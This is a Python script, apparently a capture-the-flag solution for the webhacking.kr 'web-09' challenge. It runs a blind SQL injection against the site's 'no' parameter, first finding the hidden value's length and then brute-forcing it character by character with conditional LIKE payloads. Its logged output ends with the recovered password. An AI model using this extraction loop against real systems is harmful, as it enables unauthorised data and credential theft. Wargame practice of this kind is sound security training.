# %%
import requests
url = "https://webhacking.kr/challenge/web-09/index.php?no="
params = 'if(length(id)like({}),3,0)'
TRUE_FLAG = 'Secret'

# %% [markdown]
# # Password의 길이를 구하는 쿼리

# %%
for i in range(15):
    request_url = url + params.format(i)
    response = requests.get(request_url)
    if(TRUE_FLAG in response.text):
        print("id's length : " + str(i))
# Out:
# id's length : 11

# %% [markdown]
# # Password를 구하는 쿼리

# %%
password = ''
for i in range(1,12):
    for j in range(65,127):
        params = 'if(substr(id,{},1)like({}),3,0)'.format(i,hex(j))
        print(params)
        request_url = url + params
        response = requests.get(request_url)
        if(TRUE_FLAG in response.text):
            print('find {}st character : {}'.format(i,chr(j)))
            password += chr(j)
            break

print("password is : {}".format(password))
# Out:
# if(substr(id,1,1)like(0x41),3,0)
# find 1st character : A
# if(substr(id,2,1)like(0x41),3,0)
# if(substr(id,2,1)like(0x42),3,0)
# if(substr(id,2,1)like(0x43),3,0)
# if(substr(id,2,1)like(0x44),3,0)
# if(substr(id,2,1)like(0x45),3,0)
# if(substr(id,2,1)like(0x46),3,0)
# if(substr(id,2,1)like(0x47),3,0)
# if(substr(id,2,1)like(0x48),3,0)
# if(substr(id,2,1)like(0x49),3,0)
# if(substr(id,2,1)like(0x4a),3,0)
# if(substr(id,2,1)like(0x4b),3,0)
# if(substr(id,2,1)like(0x4c),3,0)
# find 2st character : L
# if(substr(id,3,1)like(0x41),3,0)
# if(substr(id,3,1)like(0x42),3,0)
# if(substr(id,3,1)like(0x43),3,0)
# if(substr(id,3,1)like(0x44),3,0)
# if(substr(id,3,1)like(0x45),3,0)
# if(substr(id,3,1)like(0x46),3,0)
# if(substr(id,3,1)like(0x47),3,0)
# if(substr(id,3,1)like(0x48),3,0)
# if(substr(id,3,1)like(0x49),3,0)
# if(substr(id,3,1)like(0x4a),3,0)
# if(substr(id,3,1)like(0x4b),3,0)
# if(substr(id,3,1)like(0x4c),3,0)
# if(substr(id,3,1)like(0x4d),3,0)
# if(substr(id,3,1)like(0x4e),3,0)
# if(substr(id,3,1)like(0x4f),3,0)
# if(substr(id,3,1)like(0x50),3,0)
# if(substr(id,3,1)like(0x51),3,0)
# if(substr(id,3,1)like(0x52),3,0)
# if(substr(id,3,1)like(0x53),3,0)
# find 3st character : S
# if(substr(id,4,1)like(0x41),3,0)
# if(substr(id,4,1)like(0x42),3,0)
# if(substr(id,4,1)like(0x43),3,0)
# if(substr(id,4,1)like(0x44),3,0)
# if(substr(id,4,1)like(0x45),3,0)
# if(substr(id,4,1)like(0x46),3,0)
# if(substr(id,4,1)like(0x47),3,0)
# if(substr(id,4,1)like(0x48),3,0)
# if(substr(id,4,1)like(0x49),3,0)
# if(substr(id,4,1)like(0x4a),3,0)
# if(substr(id,4,1)like(0x4b),3,0)
# if(substr(id,4,1)like(0x4c),3,0)
# if(substr(id,4,1)like(0x4d),3,0)
# if(substr(id,4,1)like(0x4e),3,0)
# if(substr(id,4,1)like(0x4f),3,0)
# if(substr(id,4,1)like(0x50),3,0)
# if(substr(id,4,1)like(0x51),3,0)
# if(substr(id,4,1)like(0x52),3,0)
# find 4st character : R
# if(substr(id,5,1)like(0x41),3,0)
# if(substr(id,5,1)like(0x42),3,0)
# if(substr(id,5,1)like(0x43),3,0)
# if(substr(id,5,1)like(0x44),3,0)
# if(substr(id,5,1)like(0x45),3,0)
# if(substr(id,5,1)like(0x46),3,0)
# if(substr(id,5,1)like(0x47),3,0)
# if(substr(id,5,1)like(0x48),3,0)
# if(substr(id,5,1)like(0x49),3,0)
# if(substr(id,5,1)like(0x4a),3,0)
# if(substr(id,5,1)like(0x4b),3,0)
# find 5st character : K
# if(substr(id,6,1)like(0x41),3,0)
# if(substr(id,6,1)like(0x42),3,0)
# if(substr(id,6,1)like(0x43),3,0)
# if(substr(id,6,1)like(0x44),3,0)
# if(substr(id,6,1)like(0x45),3,0)
# if(substr(id,6,1)like(0x46),3,0)
# if(substr(id,6,1)like(0x47),3,0)
# if(substr(id,6,1)like(0x48),3,0)
# if(substr(id,6,1)like(0x49),3,0)
# if(substr(id,6,1)like(0x4a),3,0)
# if(substr(id,6,1)like(0x4b),3,0)
# if(substr(id,6,1)like(0x4c),3,0)
# if(substr(id,6,1)like(0x4d),3,0)
# if(substr(id,6,1)like(0x4e),3,0)
# if(substr(id,6,1)like(0x4f),3,0)
# if(substr(id,6,1)like(0x50),3,0)
# if(substr(id,6,1)like(0x51),3,0)
# if(substr(id,6,1)like(0x52),3,0)
# if(substr(id,6,1)like(0x53),3,0)
# find 6st character : S
# if(substr(id,7,1)like(0x41),3,0)
# if(substr(id,7,1)like(0x42),3,0)
# if(substr(id,7,1)like(0x43),3,0)
# if(substr(id,7,1)like(0x44),3,0)
# if(substr(id,7,1)like(0x45),3,0)
# if(substr(id,7,1)like(0x46),3,0)
# if(substr(id,7,1)like(0x47),3,0)
# if(substr(id,7,1)like(0x48),3,0)
# if(substr(id,7,1)like(0x49),3,0)
# if(substr(id,7,1)like(0x4a),3,0)
# if(substr(id,7,1)like(0x4b),3,0)
# if(substr(id,7,1)like(0x4c),3,0)
# if(substr(id,7,1)like(0x4d),3,0)
# if(substr(id,7,1)like(0x4e),3,0)
# if(substr(id,7,1)like(0x4f),3,0)
# if(substr(id,7,1)like(0x50),3,0)
# if(substr(id,7,1)like(0x51),3,0)
# if(substr(id,7,1)like(0x52),3,0)
# if(substr(id,7,1)like(0x53),3,0)
# if(substr(id,7,1)like(0x54),3,0)
# if(substr(id,7,1)like(0x55),3,0)
# if(substr(id,7,1)like(0x56),3,0)
# if(substr(id,7,1)like(0x57),3,0)
# find 7st character : W
# if(substr(id,8,1)like(0x41),3,0)
# if(substr(id,8,1)like(0x42),3,0)
# if(substr(id,8,1)like(0x43),3,0)
# if(substr(id,8,1)like(0x44),3,0)
# if(substr(id,8,1)like(0x45),3,0)
# if(substr(id,8,1)like(0x46),3,0)
# if(substr(id,8,1)like(0x47),3,0)
# if(substr(id,8,1)like(0x48),3,0)
# find 8st character : H
# if(substr(id,9,1)like(0x41),3,0)
# find 9st character : A
# if(substr(id,10,1)like(0x41),3,0)
# if(substr(id,10,1)like(0x42),3,0)
# if(substr(id,10,1)like(0x43),3,0)
# if(substr(id,10,1)like(0x44),3,0)
# if(substr(id,10,1)like(0x45),3,0)
# if(substr(id,10,1)like(0x46),3,0)
# if(substr(id,10,1)like(0x47),3,0)
# if(substr(id,10,1)like(0x48),3,0)
# if(substr(id,10,1)like(0x49),3,0)
# if(substr(id,10,1)like(0x4a),3,0)
# if(substr(id,10,1)like(0x4b),3,0)
# if(substr(id,10,1)like(0x4c),3,0)
# if(substr(id,10,1)like(0x4d),3,0)
# if(substr(id,10,1)like(0x4e),3,0)
# if(substr(id,10,1)like(0x4f),3,0)
# if(substr(id,10,1)like(0x50),3,0)
# if(substr(id,10,1)like(0x51),3,0)
# find 10st character : Q
# if(substr(id,11,1)like(0x41),3,0)
# if(substr(id,11,1)like(0x42),3,0)
# if(substr(id,11,1)like(0x43),3,0)
# if(substr(id,11,1)like(0x44),3,0)
# if(substr(id,11,1)like(0x45),3,0)
# if(substr(id,11,1)like(0x46),3,0)
# if(substr(id,11,1)like(0x47),3,0)
# if(substr(id,11,1)like(0x48),3,0)
# if(substr(id,11,1)like(0x49),3,0)
# if(substr(id,11,1)like(0x4a),3,0)
# if(substr(id,11,1)like(0x4b),3,0)
# if(substr(id,11,1)like(0x4c),3,0)
# find 11st character : L
# password is : ALSRKSWHAQL
